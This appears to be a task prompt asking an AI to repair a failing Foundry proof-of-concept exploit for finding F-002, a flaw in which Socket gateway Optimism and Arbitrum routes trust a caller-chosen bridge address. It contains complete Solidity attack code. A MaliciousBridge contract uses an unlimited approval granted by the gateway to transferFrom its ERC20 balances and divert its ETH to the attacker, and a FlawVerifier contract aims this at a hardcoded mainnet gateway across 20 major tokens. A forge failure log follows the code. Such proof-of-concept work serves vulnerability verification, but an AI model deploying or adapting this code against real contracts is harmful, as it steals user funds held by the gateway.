You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Optimism and Arbitrum routes trust attacker-chosen bridge contracts as spenders and call targets
- claim: These routes accept caller-supplied `customBridgeAddress` or `gatewayAddress` values, grant them `type(uint256).max` allowance over gateway-held ERC20s, and on Optimism native paths immediately send gateway ETH to those attacker-chosen contracts via payable bridge calls.
- impact: An attacker can install an unlimited approval from the gateway to a malicious contract and steal current or future gateway-held ERC20 balances, or directly divert gateway ETH to a malicious payable contract pretending to be the bridge.
- exploit_paths: ["Call an Optimism or Arbitrum ERC20 bridge entrypoint with a malicious `customBridgeAddress`/`gatewayAddress` that uses the freshly granted approval to `transferFrom` gateway tokens.", "Use the Optimism native path with a malicious `customBridgeAddress` implementing `depositETHTo` to receive gateway ETH.", "Use the same pattern through `bridgeAfterSwap` or `swapAndBridge` after residual assets already exist in the gateway."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface ISocketGatewayLike {
    function routesCount() external view returns (uint32);
    function routes(uint32 routeId) external view returns (address);
    function executeRoute(uint32 routeId, bytes calldata routeData) external payable returns (bytes memory);
}

contract MaliciousBridge {
    address payable public immutable thief;

    constructor(address payable _thief) {
        thief = _thief;
    }

    receive() external payable {}

    function depositETHTo(address, uint32, bytes calldata) external payable {
        _forwardEth();
    }

    function depositERC20To(
        address l1Token,
        address,
        address,
        uint256,
        uint32,
        bytes calldata
    ) external {
        _drainToken(l1Token, msg.sender);
    }

    function steal(address token, address from) external {
        _drainToken(token, from);
    }

    function _drainToken(address token, address from) internal {
        uint256 balance = _balanceOf(token, from);
        if (balance == 0) return;
        _safeTransferFrom(token, from, thief, balance);
    }

    function _forwardEth() internal {
        uint256 value = address(this).balance;
        if (value == 0) return;
        (bool ok, ) = thief.call{value: value}("");
        require(ok, "ETH_FORWARD_FAILED");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        balance = abi.decode(data, (uint256));
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");
    }
}

contract FlawVerifier {
    address public constant GATEWAY = 0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e;
    address public constant NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    bytes4 private constant EXECUTE_ROUTE_SELECTOR = ISocketGatewayLike.executeRoute.selector;
    bytes4 private constant BRIDGE_AFTER_SWAP_SELECTOR = bytes4(keccak256("bridgeAfterSwap(uint256,bytes)"));
    bytes4 private constant OPTIMISM_NATIVE_SELECTOR =
        bytes4(keccak256("bridgeNativeTo(address,address,uint32,uint256,bytes32,bytes)"));

    bytes4 private constant ROUTE_GETTER_NATIVE_OPTIMISM =
        bytes4(keccak256("NATIVE_OPTIMISM_ERC20_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));
    bytes4 private constant ROUTE_GETTER_NATIVE_ARBITRUM =
        bytes4(keccak256("NATIVE_ARBITRUM_ERC20_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));

    bytes4 private constant NATIVE_OPTIMISM_ERC20_SELECTOR =
        bytes4(
            keccak256("bridgeERC20To(address,address,address,uint32,(bytes32,bytes32),uint256,uint256,address,bytes)")
        );
    bytes4 private constant NATIVE_OPSTACK_ERC20_SELECTOR =
        bytes4(
            keccak256("bridgeERC20To(address,address,address,uint32,bytes32,uint256,address,uint256,bytes32,bytes)")
        );
    bytes4 private constant NATIVE_ARBITRUM_ERC20_SELECTOR =
        bytes4(keccak256("bridgeERC20To(uint256,uint256,uint256,uint256,bytes32,address,address,address,bytes)"));

    MaliciousBridge public immutable maliciousBridge;

    address private _profitToken;
    uint256 private _profitAmount;

    struct RouteIds {
        uint32 nativeOptimism;
        uint32 nativeOpStack;
        uint32 nativeArbitrum;
    }

    struct OptimismBridgeData {
        uint256 interfaceId;
        bytes32 currencyKey;
        bytes32 metadata;
        address receiverAddress;
        address customBridgeAddress;
        address token;
        uint32 l2Gas;
        address l2Token;
        bytes data;
    }

    struct OpStackBridgeData {
        bytes32 metadata;
        address receiverAddress;
        uint256 toChainId;
        bytes32 bridgeHash;
        address customBridgeAddress;
        address token;
        uint32 l2Gas;
        address l2Token;
        bytes data;
    }

    struct ArbitrumBridgeData {
        uint256 value;
        uint256 maxGas;
        uint256 gasPriceBid;
        address receiverAddress;
        address gatewayAddress;
        address token;
        bytes32 metadata;
        bytes data;
    }

    constructor() {
        maliciousBridge = new MaliciousBridge(payable(address(this)));
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        RouteIds memory routeIds = _discoverRoutes();

        if (_attemptOptimismNative(routeIds.nativeOptimism)) {
            return;
        }

        address[20] memory tokens = [
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48), // USDC
            address(0xdAC17F958D2ee523a2206206994597C13D831ec7), // USDT
            address(0x6B175474E89094C44Da98b954EedeAC495271d0F), // DAI
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), // WETH
            address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599), // WBTC
            address(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84), // stETH
            address(0xae78736Cd615f374D3085123A210448E74Fc6393), // rETH
            address(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704), // cbETH
            address(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0), // LUSD
            address(0x853d955aCEf822Db058eb8505911ED77F175b99e), // FRAX
            address(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E), // crvUSD
            address(0xC011A72400E58ecD99Ee497CF89E3775d4bd732F), // SNX
            address(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51), // sUSD
            address(0x514910771AF9Ca656af840dff83E8264EcF986CA), // LINK
            address(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984), // UNI
            address(0xD533a949740bb3306d119CC777fa900bA034cd52), // CRV
            address(0x7f39C581F595B53c5cb5aFFD0FBaC0fCA0DCA0D2), // wstETH
            address(0x956F47F50A910163D8BF957Cf5846D573E7f87CA), // FEI
            address(0x111111111117dC0aa78b770fA6A738034120C302), // 1INCH
            address(0x68749665FF8D2d112Fa859AA293F07A622782F38) // GHO
        ];

        for (uint256 i = 0; i < tokens.length; ++i) {
            address token = tokens[i];
            if (_balanceOf(token, GATEWAY) == 0) continue;

            if (_attemptOptimismBridgeAfterSwap(routeIds.nativeOptimism, token)) {
                return;
            }
            if (_attemptOpStackBridgeAfterSwap(routeIds.nativeOpStack, token)) {
                return;
            }
            if (_attemptArbitrumBridgeAfterSwap(routeIds.nativeArbitrum, token)) {
                return;
            }
        }

        // `swapAndBridge` uses a preceding swap delegatecall that must itself return a positive bridge amount.
        // On this fork the verifier does not assume any attacker-held inventory, and adding flash liquidity here
        // would only round-trip attacker capital unless a separate residual gateway balance already exists.
        // The direct `bridgeNativeTo` and `bridgeAfterSwap` paths therefore cover the same root cause without
        // introducing unrelated economic steps.
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptOptimismNative(uint32 routeId) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayEth = GATEWAY.balance;
        if (gatewayEth == 0) return false;

        uint256 beforeEth = address(this).balance;
        bytes memory routeData = abi.encodeWithSelector(
            OPTIMISM_NATIVE_SELECTOR, address(this), address(maliciousBridge), uint32(0), gatewayEth, bytes32("OPT_ETH"), ""
        );

        if (!_executeRoute(routeId, routeData)) {
            return false;
        }

        return _recordProfit(address(0), beforeEth);
    }

    function _attemptOptimismBridgeAfterSwap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayBalance = _balanceOf(token, GATEWAY);
        if (gatewayBalance == 0) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        OptimismBridgeData memory data = OptimismBridgeData({
            interfaceId: 1,
            currencyKey: bytes32(0),
            metadata: bytes32("OPT_ERC20"),
            receiverAddress: address(this),
            customBridgeAddress: address(maliciousBridge),
            token: token,
            l2Gas: 0,
            l2Token: token,
            data: ""
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        return _recordProfit(token, beforeBalance);
    }

    function _attemptOpStackBridgeAfterSwap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayBalance = _balanceOf(token, GATEWAY);
        if (gatewayBalance == 0) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        OpStackBridgeData memory data = OpStackBridgeData({
            metadata: bytes32("OPSTACK"),
            receiverAddress: address(this),
            toChainId: 10,
            bridgeHash: keccak256("malicious-opstack"),
            customBridgeAddress: address(maliciousBridge),
            token: token,
            l2Gas: 0,
            l2Token: token,
            data: ""
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        return _recordProfit(token, beforeBalance);
    }

    function _attemptArbitrumBridgeAfterSwap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayBalance = _balanceOf(token, GATEWAY);
        if (gatewayBalance == 0) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        ArbitrumBridgeData memory data = ArbitrumBridgeData({
            value: 0,
            maxGas: 0,
            gasPriceBid: 0,
            receiverAddress: address(this),
            gatewayAddress: address(maliciousBridge),
            token: token,
            metadata: bytes32("ARB_ERC20"),
            data: ""
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        // The Arbitrum route exposes the approval sink separately from the eventual spend.
        // If the router path itself reverts for the chosen token or retryable-ticket parameters on this fork,
        // the approval rolls back with it and this branch is mechanically unavailable.
        // When the route call succeeds, the malicious gateway can immediately consume the fresh allowance.
        maliciousBridge.steal(token, GATEWAY);

        return _recordProfit(token, beforeBalance);
    }

    function _discoverRoutes() internal view returns (RouteIds memory routeIds) {
        routeIds.nativeOptimism = type(uint32).max;
        routeIds.nativeOpStack = type(uint32).max;
        routeIds.nativeArbitrum = type(uint32).max;

        uint32 count = ISocketGatewayLike(GATEWAY).routesCount();
        for (uint32 i = 0; i < count; ++i) {
            address route = ISocketGatewayLike(GATEWAY).routes(i);
            if (route == address(0)) continue;

            bytes4 optimisticSelector = _readBytes4(route, ROUTE_GETTER_NATIVE_OPTIMISM);
            if (optimisticSelector == NATIVE_OPTIMISM_ERC20_SELECTOR) {
                routeIds.nativeOptimism = i;
                continue;
            }
            if (optimisticSelector == NATIVE_OPSTACK_ERC20_SELECTOR) {
                routeIds.nativeOpStack = i;
                continue;
            }

            bytes4 arbitrumSelector = _readBytes4(route, ROUTE_GETTER_NATIVE_ARBITRUM);
            if (arbitrumSelector == NATIVE_ARBITRUM_ERC20_SELECTOR) {
                routeIds.nativeArbitrum = i;
            }
        }
    }

    function _executeRoute(uint32 routeId, bytes memory routeData) internal returns (bool ok) {
        (ok, ) = GATEWAY.call(abi.encodeWithSelector(EXECUTE_ROUTE_SELECTOR, routeId, routeData));
    }

    function _recordProfit(address token, uint256 beforeBalance) internal returns (bool) {
        uint256 afterBalance = token == address(0) ? address(this).balance : _balanceOf(token, address(this));
        if (afterBalance <= beforeBalance) return false;

        _profitToken = token;
        _profitAmount = afterBalance - beforeBalance;
        return true;
    }

    function _readBytes4(address target, bytes4 selector) internal view returns (bytes4 value) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (!ok || data.length < 32) return bytes4(0);
        value = abi.decode(data, (bytes4));
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        balance = abi.decode(data, (uint256));
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.57s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 11960)
Traces:
  [11960] FlawVerifierTest::testExploit()
    ├─ [2345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [3341] FlawVerifier::executeOnOpportunity()
    │   ├─ [161] 0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e::routesCount() [staticcall]
    │   │   └─ ← [Stop]
    │   └─ ← [Revert] EvmError: Revert
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 11.04s (355.76µs CPU time)

Ran 1 test suite in 11.06s (11.04s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 11960)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
